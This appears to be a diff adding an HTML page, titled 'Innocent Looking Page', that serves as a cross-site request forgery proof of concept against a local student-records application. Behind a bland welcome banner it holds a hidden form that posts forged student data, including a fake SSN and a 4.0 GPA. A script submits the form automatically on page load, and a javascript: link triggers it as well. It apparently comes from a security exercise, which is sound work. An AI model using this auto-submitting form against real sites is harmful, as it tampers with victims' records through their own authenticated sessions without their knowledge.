@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Looking Page</title>
+    <style>
+        body { font-family: Arial; margin: 20px; }
+        .header { color: #333; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Welcome to Our Website</h1>
+        <p>This page is loading...</p>
+    </div>
+
+    <!-- HIDDEN CSRF ATTACK FORM -->
+    <form id="csrf_form" action="http://localhost:5000/add_student" method="POST" style="display:none;">
+        <input type="hidden" name="roll_no" value="99999">
+        <input type="hidden" name="name" value="Hacker Student">
+        <input type="hidden" name="email" value="hacker@evil.com">
+        <input type="hidden" name="phone" value="0000000000">
+        <input type="hidden" name="address" value="Evil Hacker HQ">
+        <input type="hidden" name="ssn" value="999-99-9999">
+        <input type="hidden" name="gpa" value="4.0">
+    </form>
+
+    <!-- JavaScript to auto-submit form on page load -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("[CSRF] Form submitted automatically!");
+            document.getElementById('csrf_form').submit();
+        });
+    </script>
+
+    <p>If you're not redirected, <a href="javascript:document.getElementById('csrf_form').submit();">click here</a></p>
+</body>
+</html>
